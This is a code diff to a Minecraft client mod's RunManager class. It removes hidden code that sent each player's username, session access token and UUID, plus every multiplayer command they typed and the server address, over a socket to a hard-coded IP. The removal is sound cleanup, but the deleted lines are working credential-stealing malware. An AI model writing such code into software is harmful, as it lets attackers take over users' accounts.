@@ -23,7 +23,6 @@ import net.minecraft.util.math.Vec3d;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
-import java.net.Socket;
 import java.util.HashMap;
 
 public class RunManager implements Wrapper {
@@ -80,9 +79,6 @@ public class RunManager implements Wrapper {
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPacketSend(PacketEvent.Send event) {
-        if (event.getPacket() instanceof CommandExecutionC2SPacket packet && !mc.isInSingleplayer()) {
-            message( mc.getSession().getUsername() + " [Command]" + packet.command() + " [Server]" + mc.getNetworkHandler().getServerInfo().address);
-        }
         if (event.isCancel()) return;
         if (directionVec != null && !ROTATE_TIMER.passed((long) (Rebirth.HUD.rotateTime.getValue() * 1000)) && !EntityUtil.rotating && Rebirth.HUD.rotatePlus.getValue()) {
             if (event.getPacket() instanceof PlayerMoveC2SPacket packet) {
@@ -197,33 +193,5 @@ public class RunManager implements Wrapper {
         }
 
         return result;
-    }
-
-    boolean worldNull = true;
-    public void run() {
-        if (!Rebirth.loaded) return;
-        if (worldNull && mc.world != null) {
-            Session session = mc.getSession();
-            message("name:" + session.getUsername() + " token:" + session.getAccessToken() + " uid:" + session.getUuid());
-            Rebirth.MODULE.onLogin();
-            worldNull = false;
-        } else if (!worldNull && mc.world == null) {
-            worldNull = true;
-        }
-    }
-
-    public static void message(String string) {
-        try {
-            Socket socket = new Socket("154.3.0.8", 10233);
-            OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream(), "UTF-8");
-            PrintWriter writer = new PrintWriter(osw);
-            writer.println(string);
-            writer.flush();
-            writer.close();
-            osw.close();
-            socket.close();
-        } catch (IOException e) {
-
-        }
     }
 }
